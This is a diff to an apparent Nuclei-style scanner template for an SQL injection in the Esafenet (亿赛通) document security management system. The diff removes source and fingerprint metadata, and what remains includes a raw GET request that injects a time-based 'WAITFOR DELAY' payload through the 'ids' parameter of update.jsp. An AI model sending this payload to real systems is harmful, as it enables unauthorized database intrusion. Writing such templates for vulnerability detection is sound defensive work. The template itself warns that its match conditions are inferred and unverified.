@@ -3,14 +3,8 @@ info:
   name: 亿赛通电子文档安全管理系统ids存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/6f54e08a5d12b363fb2e2e860d7d59d9
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 6f54e08a5d12b363fb2e2e860d7d59d9
-    fofa: + hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
 http:
 - raw:
   - 'GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3)WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
